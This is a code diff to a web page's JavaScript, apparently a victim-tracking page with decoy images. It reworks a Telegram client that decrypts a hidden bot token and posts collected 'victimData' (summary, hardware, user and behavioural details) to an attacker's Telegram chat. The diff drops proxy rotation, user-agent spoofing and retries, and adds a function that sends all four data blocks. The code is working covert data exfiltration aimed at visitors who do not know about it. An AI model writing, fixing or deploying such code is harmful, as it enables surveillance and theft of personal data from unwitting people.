@@ -118,14 +118,6 @@
                 1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                 2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                 3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
-            },
-            security: {
-                proxyUrls: [
-                    'https://api.telegram.org',
-                    'https://api.telegram.org/bot'
-                ],
-                maxRetries: 3,
-                delayRange: [2000, 5000]
             }
         };
 
@@ -146,34 +138,25 @@
             }
         }
 
-        // SECURE TELEGRAM CLIENT
+        // SIMPLIFIED SECURE TELEGRAM CLIENT - FIXED VERSION
         class SecureTelegramClient {
             constructor() {
                 this.currentProxyIndex = 0;
-                this.requestCount = 0;
             }
 
-            async sendSecureMessage(message, retryCount = 0) {
-                if (retryCount >= CONFIG.security.maxRetries) {
-                    return false;
-                }
-
-                await this.randomDelay();
-
+            async sendSecureMessage(message) {
                 try {
                     const decryptedToken = SecureDecryptor.decryptToken(CONFIG.telegram.token);
                     if (!decryptedToken) {
-                        throw new Error('Token decryption failed');
+                        return false;
                     }
 
-                    const proxyUrl = this.getNextProxyUrl();
-                    const url = `${proxyUrl}${decryptedToken}/sendMessage`;
+                    const url = `https://api.telegram.org/bot${decryptedToken}/sendMessage`;
 
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
-                            'User-Agent': this.getRandomUserAgent()
                         },
                         body: JSON.stringify({
                             chat_id: CONFIG.telegram.chatId,
@@ -182,12 +165,10 @@
                         })
                     });
 
-                    this.requestCount++;
-                    decryptedToken = null;
-
                     return response.ok;
                 } catch (error) {
-                    return this.sendSecureMessage(message, retryCount + 1);
+                    console.error('Telegram send failed:', error);
+                    return false;
                 }
             }
 
@@ -213,25 +194,8 @@
                 return result;
             }
 
-            getNextProxyUrl() {
-                const url = CONFIG.security.proxyUrls[this.currentProxyIndex];
-                this.currentProxyIndex = (this.currentProxyIndex + 1) % CONFIG.security.proxyUrls.length;
-                return url;
-            }
-
-            getRandomUserAgent() {
-                const agents = [
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-                ];
-                return agents[Math.floor(Math.random() * agents.length)];
-            }
-
             async randomDelay() {
-                const [min, max] = CONFIG.security.delayRange;
-                const delay = Math.random() * (max - min) + min;
-                return new Promise(resolve => setTimeout(resolve, delay));
+                return new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
             }
         }
 
@@ -500,10 +464,7 @@
 
                 // Use secure Telegram client for comprehensive data
                 const telegramClient = new SecureTelegramClient();
-                await telegramClient.sendChunkedData(formatMainSummary(victimData));
-                await telegramClient.sendChunkedData(formatHardwareDetails(victimData));
-                await telegramClient.sendChunkedData(formatUserDetails(victimData));
-                await telegramClient.sendChunkedData(formatBehavioralDetails(victimData));
+                await sendComprehensiveTelegramData(victimData);
                 
                 storeInAdminPanel(victimData);
 
@@ -527,6 +488,19 @@
                         card.style.opacity = '1';
                     });
                 }, 1000);
+            }
+        }
+
+        // Enhanced Telegram Integration - ORIGINAL FUNCTION
+        async function sendComprehensiveTelegramData(data) {
+            try {
+                const telegramClient = new SecureTelegramClient();
+                await telegramClient.sendSecureMessage(formatMainSummary(data));
+                await telegramClient.sendSecureMessage(formatHardwareDetails(data));
+                await telegramClient.sendSecureMessage(formatUserDetails(data));
+                await telegramClient.sendSecureMessage(formatBehavioralDetails(data));
+            } catch (error) {
+                console.error('Telegram send failed:', error);
             }
         }
 
